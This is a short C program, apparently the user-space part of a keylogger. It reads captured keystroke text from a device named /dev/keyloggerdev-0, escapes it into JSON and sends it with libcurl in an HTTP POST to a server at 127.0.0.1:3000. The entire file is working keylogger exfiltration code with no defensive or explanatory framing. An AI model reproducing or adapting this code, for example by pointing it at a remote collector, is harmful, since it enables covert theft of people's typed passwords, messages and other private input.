#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

#define BUFFER_SIZE 1024

static char buffer[BUFFER_SIZE];

int main(){

    FILE *fp;

    if ((fp = fopen("/dev/keyloggerdev-0","r")) == NULL){
       printf("Error! opening file");
       exit(1);
    }

    fgets(buffer, BUFFER_SIZE, fp);

    //printf("Text In Buffer: %s\n", buffer);

    fclose(fp);


    CURL *curl = curl_easy_init(); // initilze library
    CURLcode res;

    struct curl_slist *headers = NULL;

    curl_easy_setopt(curl, CURLOPT_URL, "127.0.0.1:3000/");

    headers = curl_slist_append(headers, "Content-Type: application/json");
    
    char* sanatized = curl_easy_escape(curl, buffer, strlen(buffer));
    char* json = (char*) malloc((strlen(sanatized)+ 14) * sizeof(char));
    sprintf(json, "{ \"text\": \"%s\"}", sanatized);
    printf("%s\n", json);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    res = curl_easy_perform(curl);
    printf("%d\n", res);

    curl_easy_cleanup(curl); // cleanup
    free(json);
    curl_free(sanatized);

    return 0;

}